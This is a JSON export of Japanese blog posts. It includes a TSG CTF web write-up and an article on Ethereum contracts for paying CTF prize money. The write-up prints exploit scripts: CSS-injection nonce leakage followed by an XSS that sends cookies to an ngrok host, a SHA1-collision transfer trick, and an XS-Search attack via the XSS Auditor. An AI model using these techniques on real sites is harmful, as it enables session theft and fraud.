おしまい\n\nISUCONは学びが多い。\n\nあと、予選で雑にmysqlの全テーブルをMEMORYストレージエンジンにしたらメモリが完売してSSHできなくなって焦るなどの事件もありました。\n（運営に再起動してもらって事なきを得ました。）\n","title":"ISUCON10 やらかしリスト","image":null,"tags":["参加記","インフラ","ISUCON","AppArmor","systemd"],"date":"2020-10-04T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"external","url":"https://engineering.mercari.com/blog/entry/phisical-server-setup/","publisher":"メルカリエンジニアリング","title":"物理サーバのセットアップをon-the-fly ISO patchingで自動化した話","tags":["mercari","自動化","インフラ"],"date":"2020-08-28T00:00:00.000Z"},{"type":"external","url":"https://qiita.com/sekai/items/489378d60267cc85fd34","publisher":"Qiita","title":"Set-Cookieが不正な文字列、もしくは解釈が自明でない場合の挙動について","tags":["Qiita","HTTP","Web","Cookie","RFC"],"date":"2020-03-12T09:23:47.000Z"},{"type":"external","url":"https://qiita.com/sekai/items/b5e5e05da2dfe6ff1bf3","publisher":"Qiita","title":"Name Service SwitchでConoHaインスタンスのIPアドレスを引く","tags":["Qiita","アドベントカレンダー","ConoHa","NSS","インフラ"],"date":"2019-12-19T22:00:46.000Z"},{"type":"external","url":"https://qiita.com/sekai/items/1332ff8a62d8aeea94d3","publisher":"Qiita","title":"statically linkedなGNU nanoをビルドする","tags":["Qiita","エディタ","nano"],"date":"2019-10-08T04:11:08.000Z"},{"type":"external","url":"https://qiita.com/sekai/items/e053932512d6d43e06e4","publisher":"Qiita","title":"インターネットに接続されていない環境下でWindows ServerにOpenSSHを入れる","tags":["Qiita","SSH","OpenSSH","RDP","WindowsServer"],"date":"2019-07-02T14:23:44.000Z"},{"type":"article","slug":"27","body":"[TSG CTF](https://ctftime.org/event/758)にチームNaruseJunで出ました。4099ptsを獲得して3位でした。\n\n[TSG CTF](https://ctftime.org/event/758)\n\n私はWeb問のみを解きました。以下write-upです。\n\n# BADNONCE Part 1 (247pts)\n\nCSPが有効になっているページでXSSしてCookieを盗ってください、という問題でした。\n\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'nonce-<?= $nonce ?>';\">\n```\n\n問題名が **BADNONCE** なので明らかにnonceの実装が悪そうです。\n実際、以下のようにセッションIDに対してnonceが固定なので、これが漏れるとXSSが可能になります。\n\n```php\nsession_start();\n$nonce = md5(session_id());\n```\n\n件のnonceは、ページ内の要素の属性として存在しています。\n\n```html\n<script nonce=<?= $nonce ?>>\n\t\t\t\tconsole.log('Welcome to the dungeon :-)');\n</script>\n```\n\nところで、このページでは`script-src`のみ制限されているので、たとえばスタイルシートなどは外部ソースから読み込み放題です。\nしたがって、CSS Injectionが可能です。セレクタを工夫することによって、要素の属性値を特定することができますね。\n\n[CSS Injection 再入門 – やっていく気持ち](https://diary.shift-js.info/css-injection/)\n\nただし、管理者のブラウザを模したクローラは、毎回異なるPHPSESSIDを持つため、1度の起動で最後までnonceを抜きとって、XSSを踏ませるところまでやらないといけません。\nちょっと面倒ですが、管理者に攻撃車が用意したURLをIFRAMEで開き続けるページを踏ませて、InjectするCSSを変えながら、最終的にXSSを発火させるようにしました。\n以下のような実装になりました。Web問のExploitにしてはちょっと重めかも。もっと頭のいい方法が存在する可能性もあり。\n\n```php\n<?php\n\tif (array_key_exists(\"save\", $_GET)) {\n\t\tfile_put_contents(\"flag.txt\", $_GET[\"save\"] . PHP_EOL, LOCK_EX | FILE_APPEND);\n\t}\n\telse if (array_key_exists(\"nonce\", $_GET)) {\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\tif (strlen($nonce) < strlen($_GET[\"nonce\"])) {\n\t\t\tfile_put_contents(\"nonce.txt\", $_GET[\"nonce\"], LOCK_EX);\n\t\t}\n\t}\n\telse if (array_key_exists(\"css\", $_GET)) {\n\t\theader(\"Content-Type: text/css\");\n\t\techo(\"script { display: block }\" . PHP_EOL);\n\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\t$chars = str_split(\"0123456789abcdef\");\n\n\t\tforeach ($chars as $c1) {\n\t\t\tforeach ($chars as $c2) {\n\t\t\t\t$x = $nonce . $c1 . $c2;\n\t\t\t\techo(\"[nonce^='\" . $x . \"'] { background: url(http://cf07fd07.ap.ngrok.io/?nonce=\" . $x . \") }\" . PHP_EOL);\n\t\t\t}\n\t\t}\n\t}\n\telse if (array_key_exists(\"go\", $_GET)) {\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\tif (strlen($nonce) < 32) {\n\t\t\theader(\"Location: http://35.187.214.138:10023/?q=%3Clink%20rel%3D%22stylesheet%22%20href%3D%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fcss%3D\" . microtime(true) . \"%22%3E\");\n\t\t}\n\t\telse {\n\t\t\theader(\"Location: http://35.187.214.138:10023/?q=%3Cscript%20nonce%3D%22\" . $nonce . \"%22%3Efetch(%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fsave%3D%22%20%2B%20encodeURIComponent(document.cookie))%3C%2Fscript%3E\");\n\t\t}\n\t}\n\telse if (array_key_exists(\"start\", $_GET)) {\n\t\tfile_put_contents(\"nonce.txt\", \"\", LOCK_EX);\n\t\tfile_put_contents(\"flag.txt\", \"\", LOCK_EX);\n?>\n<html>\n<body>\n<script>\n\tsetInterval(() => {\n\t\tconst iframe = document.createElement(\"iframe\");\n\t\tiframe.src = `?go=${(new Date).getTime()}`;\n\t\tdocument.body.appendChild(iframe);\n\t}, 256);\n</script>\n</body>\n</html>\n<?php\n\t}\n\telse {\n\t\techo(\"E R R O R !\");\n\t}\n?>\n```\n\n# Secure Bank (497pts)\n\nrubyで書かれたアプリケーションで、コインの送受信ができます。\nたくさんのコインを集めれば、FLAGが入手できるようです。\n\n```ruby\n  get '/api/flag' do\n    return err(401, 'login first') unless user = session[:user]\n\n    hashed_user = STRETCH.times.inject(user){|s| Digest::SHA1.hexdigest(s)}\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_user\n    row = res.next\n    balance = row && row[0]\n    res.close\n\n    return err(401, 'login first') unless balance\n    return err(403, 'earn more coins!!!') unless balance >= 10_000_000_000\n\n    json({flag: IO.binread('data/flag.txt')})\n  end\n```\n\n怪しいのは送金コードで、こういう形。\n\n```ruby\n  post '/api/transfer' do\n    return err(401, 'login first') unless src = session[:user]\n\n    return err(400, 'bad request') unless dst = params[:target] and String === dst and dst != src\n    return err(400, 'bad request') unless amount = params[:amount] and String === amount\n    return err(400, 'bad request') unless amount = amount.to_i and amount > 0\n\n    sleep 1\n\n    hashed_src = STRETCH.times.inject(src){|s| Digest::SHA1.hexdigest(s)}\n    hashed_dst = STRETCH.times.inject(dst){|s| Digest::SHA1.hexdigest(s)}\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_src\n    row = res.next\n    balance_src = row && row[0]\n    res.close\n    return err(422, 'no enough coins') unless balance_src >= amount\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_dst\n    row = res.next\n    balance_dst = row && row[0]\n    res.close\n    return err(422, 'no such user') unless balance_dst\n\n    balance_src -= amount\n    balance_dst += amount\n\n    DB.execute 'UPDATE account SET balance = ?  WHERE user = ?', balance_src, hashed_src\n    DB.execute 'UPDATE account SET balance = ?  WHERE user = ?', balance_dst, hashed_dst\n\n    json({amount: amount, balance: balance_src})\n  end\n```\n\nぱっと見たところ、トランザクションを考慮していないので、高頻度でリクエストを飛ばせばRace Conditionで二重送金ができそうだったんですが、軽く試したところ、タイミングがシビアでほとんどうまくいかなかったので、この方針は諦めました。\n\nところで、このコードをもう少しよく見ると、宛先と送金元が同一のユーザであったとき、コインが増殖することは明らかです。\nもちろん、自分自身への送金はエラーになる実装となっているんですが、残高の照会をユーザ名をハッシュした値で行っているのに対して、ユーザの同一性判定は元の文字列で行っています。\nつまりは、別の文字列であって、SHA1ハッシュの結果が同一になる文字列の組がもし存在すれば、無限にコインを増やすことができそうです。\n\nSHA1の衝突といえば……[SHAttered](https://shattered.io/)ですよね。\n詳しい理屈はググってもらうとして、これを用いれば、先に述べた要件を満たすような文字列（というかバイト列）の組が用意できます。\n\nJSONとしてnon-printableな文字を送る際に破壊されないように注意しつつ、以下のようにして用意しました。\n\n```php\n<?php\n\t$s1 = file_get_contents(\"shattered-1.pdf\");\n\t$s2 = file_get_contents(\"shattered-2.pdf\");\n\n\t$t1 = substr($s1, 0, 320) . \"narusejun\";\n\t$t2 = substr($s2, 0, 320) . \"narusejun\";\n\n\techo(sha1($t1) . PHP_EOL);\n\techo(sha1($t2) . PHP_EOL);\n\n\tfunction toStr($c) {\n\t\t$i = ord($c);\n\t\tif ($c == '\"') {\n\t\t\treturn '\\\\\"';\n\t\t}\n\t\tif ($c == '%') {\n\t\t\treturn '%%';\n\t\t}\n\t\tif ($i < 0x20) {\n\t\t\treturn sprintf(\"\\\\u%04x\", $i);\n\t\t}\n\t\tif ($i < 0x7F) {\n\t\t\treturn $c;\n\t\t}\n\t\treturn sprintf(\"\\\\x%02x\", ord($c));\n\t}\n\t$u1 = implode(array_map(toStr, str_split($t1)));\n\t$u2 = implode(array_map(toStr, str_split($t2)));\n\n\techo($u1 . PHP_EOL);\n\techo($u2 . PHP_EOL);\n?>\n```\n\nこの文字列のどちらかを使って登録した上で、もう一方の文字列を宛先として指定して送金すると、コインが増殖します。\ncurlを使うと容易です。\n\n# RECON (500pts)\n\nWeb問です。PHPで実装された、プロフィールを登録できるサービスです。\n秘密の質問として20種類のフルーツが好きか否かを選択できるようになっていて、どうやらadminの好きなフルーツをRECONすれば良いみたいです。\n\nソースコードを見ると、自身のプロフィールを確認するページで露骨にCSPが弱められていて、怪しさがあります。\n\n```php\n$response->withHeader(\"Content-Security-Policy\", \"script-src-elem 'self'; script-src-attr 'unsafe-inline'; style-src 'self'\")\n```\n\nこの要素は新しい機能なので、`script-src-elem`と`script-src-attr`が効いていなくて、実質XSSし放題になっているようでした。\nしかしながら、このページはログインしたユーザ自身のプロフィールを表示するものですので、狙った相手にコードを実行させるのは厳しそうな雰囲気があります。\n\nところで、そもそも何故`script-src-attr`などという特殊な(?)制限が付されているのでしょうか？\nこの答えは、このページのソースを注意深く見るとすぐに気が付きました。\n\n```html\n🍇 <input type=\"checkbox\" id=\"grapes\" onchange=\"grapes.checked=false;\" >\n🍈 <input type=\"checkbox\" id=\"melon\" onchange=\"melon.checked=false;\" >\n🍉 <input type=\"checkbox\" id=\"watermelon\" onchange=\"watermelon.checked=false;\" >\n🍊 <input type=\"checkbox\" id=\"tangerine\" onchange=\"tangerine.checked=false;\" >\n🍋 <input type=\"checkbox\" id=\"lemon\" onchange=\"lemon.checked=false;\" >\n🍌 <input type=\"checkbox\" id=\"banana\" onchange=\"banana.checked=false;\" >\n🍍 <input type=\"checkbox\" id=\"pineapple\" onchange=\"pineapple.checked=false;\" >\n🍐 <input type=\"checkbox\" id=\"pear\" onchange=\"pear.checked=false;\" >\n🍑 <input type=\"checkbox\" id=\"peach\" onchange=\"peach.checked=false;\" >\n🍒 <input type=\"checkbox\" id=\"cherries\" onchange=\"cherries.checked=false;\" >\n🍓 <input type=\"checkbox\" id=\"strawberry\" onchange=\"strawberry.checked=false;\" >\n🍅 <input type=\"checkbox\" id=\"tomato\" onchange=\"tomato.checked=false;\" >\n🥥 <input type=\"checkbox\" id=\"coconut\" onchange=\"coconut.checked=false;\" >\n🥭 <input type=\"checkbox\" id=\"mango\" onchange=\"mango.checked=false;\" >\n🥑 <input type=\"checkbox\" id=\"avocado\" onchange=\"avocado.checked=false;\" >\n🍆 <input type=\"checkbox\" id=\"aubergine\" onchange=\"aubergine.checked=false;\" >\n🥔 <input type=\"checkbox\" id=\"potato\" onchange=\"potato.checked=false;\" >\n🥕 <input type=\"checkbox\" id=\"carrot\" onchange=\"carrot.checked=false;\" >\n🥦 <input type=\"checkbox\" id=\"broccoli\" onchange=\"broccoli.checked=false;\" >\n🍄 <input type=\"checkbox\" id=\"mushroom\" onchange=\"mushroom.checked=false;\" >\n```\n\n秘密の質問がプロフィールページに表示されているんですが、この変更を禁止する目的でJavaScriptが用いられているのでした！\nこのコードのみ実行できるようにする目的で、部分的なunsafe-inlineが許容されていたようです。\n\nもし、この小さなJavaScriptコードを盗むことができれば、adminの好きなフルーツを知ることできそうです。\nこのページでは、`X-XSS-Protection: 1; mode=block`というヘッダが送信されていて、XSS Auditorがブロックモードで動作することが期待されていて、adminのブラウザもこれに従っているでしょう。\nこういう場合に、XSS Auditorの誤検出を利用して、ページ内のスクリプトを盗む手法が存在します。\n\n[ブラウザのXSSフィルタを利用した情報窃取攻撃 | MBSD Blog](https://www.mbsd.jp/blog/20160407_2.html)\n\nこれを利用できそうです。（できました。）\n以下のような2つのIFRAMEを表示させれば、どちらか一方をXSS Auditorがブロックするはずです。\n\n```html\n<iframe src='http://34.97.74.235:10033/profile?onchange=\"melon.checked=true;\"'></iframe>\n<iframe src='http://34.97.74.235:10033/profile?onchange=\"melon.checked=false;\"'></iframe>\n```\n\nこの性質を利用し、攻撃者のページで2つのIFRAMEを開かせて、どちらがブロックされたかを判別すれば良いですね。\nIFRAME要素の`contentWindow.length`を見ると、XSS Auditorが作動したか否かを簡単に判別できるようでしたが、手元で試したときに何故かうまくいかなかったので（これは勘違いだったかもしれませんが）、`onload`が発火するまでの時間を計測するちょっと面倒な方法で判別しています。\nXSS Auditorが作動すると、関連リソースの読み込みが走らないので、`onload`が早く呼ばれるはずです。\n\n以下のように実装し、IFRAMEをプロフィールに埋め込んで、adminにアクセスさせました。\nJavaScriptの記法モダンだったりレガシーだったりしていて、気持ち悪いんですが、終了ギリギリで解いていたためいろいろ焦っていて、見当違いの試行錯誤をしていた名残です。\n\n```php\n<?php\n\tif(array_key_exists(\"save\", $_GET)){\n\t\tfile_put_contents(\"save.txt\", $_GET[\"save\"] . PHP_EOL, FILE_APPEND | LOCK_EX);\n\t\techo(\"OK!\");\n\t}else{\n?>\n<html>\n<body>\n<script>\n\nfunction test(key, val){\n\treturn new Promise(function(resolve){\n\t\tconst iframe = document.createElement(\"iframe\");\n\t\tiframe.onload = function(){\n\t\t\tiframe.remove();\n\t\t\tresolve([key, val, new Date().getTime() - time]);\n\t\t};\n\t\tiframe.src = `http://34.97.74.235:10033/profile?onchange=\"${key}.checked=${val};\"`;\n\t\tconst time = new Date().getTime();\n\t\tdocument.body.appendChild(iframe);\n\t});\n}\n\n(async () => {\n\tconst results = [];\n\tfor(let i = 0; i < 1; i++){\n\t\tresults.push([\n\t\t\tawait test(\"mushroom\", true),\n\t\t\tawait test(\"mushroom\", false),\n\t\t]);\n\t}\n\tlocation.href = \"?save=\" + results;\n})();\n</script>\n</body>\n</html>\n<?php\n\t}\n?>\n```\n\nこれを用いて、フルーツ1種類ごとに計測した結果が以下のとおりです。\nCaptchaを連打する必要があって、激ツラかったです。チームメイトにひたすらCaptchaしてもらいました。（もっと頭の良い実装をすればよかった気もしますが。）\n\n| フルーツ | trueのonload(ms)| falseのonload(ms) | 判定結果 |\n| --- | --- | --- | --- |\n| grapes | 84 | 334 | TRUE |\n| melon | 347 | 65 | FALSE |\n| watermelon | 245 | 47 | FALSE |\n| tangerine | 78 | 394 | TRUE |\n| lemon | 83 | 418 | TRUE |\n| banana | 73 | 255 | TRUE |\n| pineapple | 79 | 452 | TRUE |\n| pear | 252 | 48 | FALSE |\n| peach | 74 | 281 | TRUE |\n| cherries | 76 | 336 | TRUE |\n| strawberry | 79 | 318 | TRUE |\n| tomato | 77 | 353 | TRUE |\n| coconut | 77 | 333 | TRUE |\n| mango | 92 | 404 | TRUE |\n| avocado | 254 | 47 | FALSE |\n| aubergine | 85 | 333 | TRUE |\n| potato | 249 | 46 | FALSE |\n| carrot | 72 | 321 | TRUE |\n| broccoli | 428 | 40 | FALSE |\n| mushroom | 87 | 388 | TRUE |\n\nあとは、この結果を用いてadminのrecoveryメッセージ（FLAG）を表示させることができました。\n\n# 総括\n\nWeb問しか触っていないので他のジャンルはわかりかねますが、良い問題でした。\n\n- 誘導が適切で、guessが最小限で済んだ\n- 扱っているテーマも面白いものだった\n\nおわりです。\nなんか💰を貰えるらしいので、焼肉にでも行きたいです🐦\n\nhttps://twitter.com/tsgctf/status/1124933926202560512\n","title":"TSG CTF write-up (Web)","image":null,"tags":["参加記","CTF"],"date":"2019-05-05T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"26","body":"この記事は[CTF Advent Calendar 2018](https://adventar.org/calendars/3210)の23日目の記事です！\n\n[CTF Advent Calendar 2018](https://adventar.org/calendars/3210)\n\n本稿では、Ethereumスマートコントラクトを用いて、CTF（に限らず、様々なイベント）の賞金支払いをどう行うか？を検討してみます。\n\n## はじめに\n\n[**Capture The Flag**](https://ja.wikipedia.org/wiki/%E3%82%AD%E3%83%A3%E3%83%97%E3%83%81%E3%83%A3%E3%83%BC%E3%83%BB%E3%82%B6%E3%83%BB%E3%83%95%E3%83%A9%E3%83%83%E3%82%B0#%E3%82%B3%E3%83%B3%E3%83%94%E3%83%A5%E3%83%BC%E3%82%BF%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3)においては、その上位者に賞金が支払われる大会がしばしば開催されている。\n\nこうしたCTFをはじめとする各種賞金付き大会において、その賞金の支払いを**DApps**を用いて行う事を考える。\n\n## DAppsを用いる意義\n\n- 確かに賞金が用意されていることを証明できる\n- 主催者が賞金を支払う意志があることをアピールできる\n- 入賞者自身が引き出しを行うので、支払いの手間がかからない\n\n# DAppsを用いた賞金付きCTF\n\n今回は簡単化のため、**優勝者のみに賞金が支払われ**、**問題数は1つ**（正解のFLAGが1つ）の単純な大会を想定とする。\nまた、優勝者は「FLAGを入手し、賞金支払い手続きを最も早く行った参加者」と定義する。\n\nDAppsやブロックチェーンなど、分散基盤上で「賞金支払い」を行う場合に、大きく問題となるのが**未受理トランザクション**の存在である。\n要は、未受理のままネットワーク（mempool）を漂っているトランザクションをコピーしてより高い手数料を付与すれば、最初にトランザクションを投入した参加者の賞金受け取り権利を横取りできてしまう、という話である。\n\n優勝者が**必ず、もしくは極めて高い確率で賞金を手にする**ことができるDAppsを考えてみよう。\n\n## 従来手法\n\n### [1]: [Bitcoinによる新しいCapture The Flag（CTF）](https://qiita.com/yyu/items/b6f367eb876dd28e759a)\n\n[Bitcoinによる新しいCapture The Flag（CTF）](https://qiita.com/yyu/items/b6f367eb876dd28e759a)\n\nこの手法では、FLAG検証に参加者固有の値を用いることで先述の問題を解決している。\nブロックチェーン上に**各参加者ごとに固有のFLAGハッシュ**を予め記憶しておくことで、検証を行う。\n\nチーム$T_i$はFLAG文字列$F$を入手すると、$h_i=H(F||i)$を含むトランザクションを提出する。$H$は適当なハッシュ関数である。\nこのトランザクションに対し、予め記録されている$ans_i=H(h_i)$と比較することで正しいFLAGを持っているか検証できる。\n仮にチーム$T_j$がこのトランザクションをコピーしても、チーム$T_j$に対する正解$ans_j$は$ans_i$と異なるため、正解とみなされない。\nまた、$h_i$を入手してもハッシュの原像計算困難性により、$F$は入手できない。\n\nEthereumを用いて実装した例もある。\n\n[Solidityで作るCapture The Flag](http://lotz84.hatenablog.com/entry/2018/01/02/134056)\n\nしかし、[1]では**予めCTFイベントへの参加者が確定している**必要があり、開始時刻以降は参加者を追加できない。\n開催中にイベントの存在を知ったユーザが新たに参加できず、ユーザビリティを欠いている。\n\n### [2]: [ERC20トークンを用いた宝探しゲーム(真)の提案](https://trap.jp/post/561/)\n\n[ERC20トークンを用いた宝探しゲーム(真)の提案](https://trap.jp/post/561/)\n\nこの手法では、テーマとして「宝探し」を取り扱っているが、秘密の文字列を何らかの手段によって入手した参加者に報奨を与えるという点で、\n**お宝**を**FLAG**に、**ERC20トークン**を**賞金**と読み替えれば、CTFにおける賞金支払いに応用可能である。\n\n基本的なアイデアは[1]とほぼ同等で、**各参加者ごとに固有のFLAGハッシュ**がスマートコントラクト上に記録されている。\n\n[1]と異なるの　は、後から参加者の追加を可能としている点である。\n[1]がBitcoinの`scriptPubKey`で記述されているのに対して、[2]ではEthereumスマートコントラクト上で実装しているため、より柔軟なDAppsが記述できている。\n\nしかしながら、[2]では参加者の追加をするために**主催者が手数料を支払う必要がある**。\n一度デプロイが完了した後にも、コントラクトの面倒を見続ける必要があるのは欠点であると言えよう。\n\n加えて、DoS攻撃の余地がある。\nEthereumのEOAアドレスは無コストで生成可能であるので、何度も参加要求を送り続けければ、主催者のEthereumが枯渇してしまう。\nこれを防ぐには、何らかのオフチェーン要素とアドレスを紐付けて個人を特定する、CTFへの参加に手数料を徴収する、などが考えられる。\nしかし、これらは主催者側の負担が大きい。到底De-centralized Appsとは呼べるものではない！\n\nさらに、[2]では**主催者がこっそり賞金を自分の懐に収める**可能性を排除できない。\n[1]では、予め参加者を確定させておくことでこの問題をうまく回避している。\n\n## 提案手法\n\n提案手法では、**後から参加者が追加可能であり、その際に手数料を必要としない**ことを目標とする。\nまた、DAppsプラットフォームとしては、Ethereumスマートコントラクトを想定している。\n\n## [N案]: コミットメントによる引き出し\n\n本手法では、予めFLAGハッシュをコントラクト上に乗せることなく、検証時には参加者ごとに異なるFLAGハッシュを用いて検証することを目指す。\nこれを可能とするのが**コミットメント方式**である。コミットメントについては、[Wikipediaの解説](https://ja.wikipedia.org/wiki/%E3%83%93%E3%83%83%E3%83%88%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%83%A1%E3%83%B3%E3%83%88)や[ブロックチェーンを利用した公平なガチャの提案](https://qiita.com/yyu/items/4eaa43693e39c60a8661)が詳しい。\n\nコントラクト上には、FLAG文字列$F$のハッシュ$F'=H(F)$を予め記録されている。$H$は適当なハッシュ関数である。\nまず、**commit**と**reveal**の2つの操作を定義する。\n\n**commit**は、言わば**賞金を引き出す権利の予約**である。\n参加者$T_i$は、FLAG文字列$F$を入手すると、自身のアドレス$A_i$を用いてコミット$C_i=H(F||A_i)$を送信する。\nコミット$C_i$は、コントラクト上に格納される。また、$C_i$は従来手法で予めコントラクト上に格納しておくものと等しい。\nこの時点では、トランザクションを観察しても$F$は復元困難である。これがコミットメント方式の**秘匿性**である。\n\n**reveal**は、**予約した権利が正当であることを証明**し、それを行使して**賞金を引き出す**操作である。\n参加者$T_i$は、FLAG文字列$F$を単に公開する。コントラクトは、$H(F)$を計算し、予め記録されている$F'$と比較して、FLAG文字列が正しいかを確認した後、\n$H(F||A_i)$を計算し、commit時に記録された$C_i$と比較を行うことで、**参加者はcommitの時点でこのFLAGを本当に所有していたのかを確認する**。\n以上で、commit時点で正しいことFLAGを所有していたことが確認されれば、直ちに賞金を支払う。\ncommit時に提出したFLAGは、reveal時に変更できない。これがコミットメント方式の**拘束性**である。\n\nコミットメント方式による賞金支払いでは、**revealした瞬間にFLAG文字列が全員に対して明らかになる**点に注意が必要である。\nそのため、検証を2段階に分けたとしても、誰かがrevealした瞬間に高手数料でcommitし、すぐにrevealすれば逆転可能性がある。\n\nこの手法のキモは、**commitから一定時間（ブロック高）が経過しないとrevealできない**ような制約を設けることにある。\nこれによって、revealトランザクションを投入した瞬間から一定時間内は、**攻撃者は絶対に引き出しができない**。\nしたがって、この一定時間内にrevealトランザクションが承認されれば良いため、極めて高い確率で**最も先にcommitした参加者に**賞金が支払われる。\n一定時間の遅延は、言わば攻撃者の賞金引き出し操作を遅延させるために存在するものと言える。\n\nSolidityによる実装例は以下。\n\n```js\npragma solidity ^0.5.0;\n\ncontract Prize {\n\tevent Commit(address sender, uint revealable);\n\n\tbytes32 private flagHash;\n\n\tmapping(address => bytes32) private commits;\n\tmapping(address => uint) private revealable;\n\n\tconstructor(bytes32 _flagHash) public payable {\n\t\tflagHash = _flagHash;\n\t}\n\n\tfunction commit(bytes32 commitment) external {\n\t\tcommits[msg.sender] = commitment;\n\t\temit Commit(msg.sender, revealable[msg.sender] = block.number + 128);\n\t}\n\tfunction reveal(bytes32 flag) external {\n\t\trequire(calcFlagHash(flag) == flagHash);\n\t\trequire(calcCommitment(flag, msg.sender) == commits[msg.sender]);\n\t\trequire(block.number >= revealable[msg.sender]);\n\t\tselfdestruct(msg.sender);\n\t}\n\n\tfunction calcFlagHash(bytes32 flag) public pure returns(bytes32) {\n\t\treturn keccak256(abi.encodePacked(flag));\n\t}\n\tfunction calcCommitment(bytes32 flag, address sender) public pure returns(bytes32) {\n\t\treturn keccak256(abi.encodePacked(flag, sender));\n\t}\n}\n```\n\n## [A案]: コミットメントによる権利移転\n\n[N案]では、要件を満たす賞金支払いDAppsを定義したが、この方式には1点課題が残る。\nそれは、**一定時間が経過しなくてもrevealできてしまう**点である。\n\nこの場合、正しく実装されたコントラクトでは、支払いは行われず、**FLAGが想定より早く公開されてしまう**。\n一定時間が経過する前にrevealした参加者は、我々が苦心して用意した権利保護期間を自ら捨て去ってしまったことになるのだ！\n\n[N案]を拡張し、こうした誤操作が起こりえない、言わばフールプルーフ的な構造を取り入れたのが[A案]である。\n\n**commit**と**reveal**の2つに加えて、新たに**withdraw**操作を定義する。\n\n**commit**では、[N案]の$C_i$に加えて、commitした時刻（ブロック高）を記録しておく。\n\n**reveal**では、[N案]と同様の検証を行った後に、**権利の移転**を行う。\n[A案]では、コントラクト上で「現在の引き出し権利者」（優勝者）を記憶している。\n権利の移転とは、現在の権利者がcommitした時刻よりも、早い時刻にcommitした参加者がrevealした際に、権利を移動する操作である。\n\nそして**withdraw**は、引き出し権利を行使して賞金を引き出すものである。\nこの権利行使を遅延させるのが[A案]である。遅延は、「commit時から一定時間後」でもいいし「権利取得時から一定時間後」でも良い。\ncommit時から一定時間後としたほうが、参加者の待ち時間は短くなり、ユーザビリティが向上するだろう。\n\nこれによって、commit後に即時revealしても損をすることがない。\nrevealトランザクションを見てすぐさま権利を横取りしたとしても、withdrawの遅延によってすぐに引き出せないし、その間に正当権利者がrevealすれば良い。（commitが最も早いものが最終的な権利を得る。）\n\nSolidityによる実装例は以下。\n\n```js\npragma solidity ^0.5.0;\n\ncontract Prize {\n\tevent Commit(address sender, uint withdrawable);\n\tevent Reveal(address sender, uint withdrawable);\n\n\tbytes32 private flagHash;\n\taddress payable private winner;\n\n\tmapping(address => bytes32) private commits;\n\tmapping(address => uint) private withdrawable;\n\n\tconstructor(bytes32 _flagHash) public payable {\n\t\tflagHash = _flagHash;\n\t}\n\n\tfunction commit(bytes32 commitment) external {\n\t\tcommits[msg.sender] = commitment;\n\t\temit Commit(msg.sender, withdrawable[msg.sender] = block.number + 128);\n\t}\n\tfunction reveal(bytes32 flag) external {\n\t\trequire(calcFlagHash(flag) == flagHash);\n\t\trequire(calcCommitment(flag, msg.sender) == commits[msg.sender]);\n\t\trequire(winner == 0 || withdrawable[msg.sender] < withdrawable[winner]);\n\t\temit Reveal(winner = msg.sender, withdrawable[msg.sender]);\n\t}\n\tfunction withdraw() external {\n\t\trequire(msg.sender == winner);\n\t\trequire(block.number >= withdrawable[msg.sender]);\n\t\tselfdestruct(msg.sender);\n\t}\n\n\tfunction calcFlagHash(bytes32 flag) public pure returns(bytes32) {\n\t\treturn keccak256(abi.encodePacked(flag));\n\t}\n\tfunction calcCommitment(bytes32 flag, address sender) public pure returns(bytes32) {\n\t\treturn keccak256(abi.encodePacked(flag, sender));\n\t}\n}\n```\n\n## 提案手法の課題\n\n### 主催者による賞金回収\n\n[2]の問題として上げた以下の点は、解決できていない。\n\n> **主催者がこっそり賞金を自分の懐に収める**可能性を排除できない。\n\nしかし、後から参加者の追加を許す場合では、この可能性を排除することは極めて難しい。\nこの問題についてはとりあえずは目をつむって、主催者は信頼に足る人間である、ということにしておこう……！\n\n### 暗号通貨に価値があることを前提としている\n\nまぁいいじゃん。\nアゼルバイジャン。\n\n## おわりに\n\nコミットメントの持つ秘匿性・束縛性を活用し、後から参加者が追加可能であり、その際に手数料を必要としない賞金支払いコントラクトを提案した。\n\n### 謝辞\n\n本稿は、[@42_0N](https://twitter.com/42_0N)氏との長時間に渡る議論を経て書き上げたものです。\nありがとナス！！！！！！！！\n\n----\n\nところで、最近公開したミニCTF:[NaruseJunCTF](https://we.are.participating.in.seccon.international/)はプレイして頂けましたか？\nなんと、全問正解者には賞金があります！（2018/12/23 現在 まだ賞金は残ってます）\n賞金支払いには[N案]コントラクトを用いていますヨ。DAppsによる賞金受け取りを是非体験してみてくださいネ。\n","title":"DAppsによる賞金付きCTF","image":null,"tags":["アドベントカレンダー","CTF","DApps","Ethereum","スマートコントラクト"],"date":"2018-12-23T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"25","body":"この記事は[ConoHa Advent Calendar 2018](https://qiita.com/advent-calendar/2018/conoha)の21日目の記事です！\n\n[ConoHa Advent Calendar 2018](https://qiita.com/advent-calendar/2018/conoha)\n\n# ConoHaの[DNS API](https://www.conoha.jp/docs/)は便利\n\nという話を[2年前](/posts/14/)にもしたのでした。\n\n[2年前の記事](/posts/14/)\n\n皆さん、ConoHaのDNS API使ってますか？\nLet's EncryptのDNS-01チャレンジの自動化にも使える！のでイケてますね。\n\n## APIクライアントについて\n\nさて、ではどうやってAPIを叩くか？\n先に紹介した記事の要旨は「ConoHa DNS用 APIクライアント 作った」なんですが、あまりにも使い辛いので無視します。\n\n### Designateクライントを使う\n\nConoHaのDNSは[OpenStack Designate](https://docs.openstack.org/designate/latest/)を使っているようです。多分。API体系がソレっぽいので。\n\nなので、[Designateのクライアント](https://docs.openstack.org/python-designateclient/latest/cli/index.html)が使えるかもしれない……？（未確認）\n\nしかし、ConoHaではdeprecatedなv1 APIのみ提供されているので、互換性の面で死ぬかもしれません。\n[一応v2も動いている](https://dns-service.tyo1.conoha.io/)ようですが、不完全なようですし、そもそもundocumentedです。\n\n### 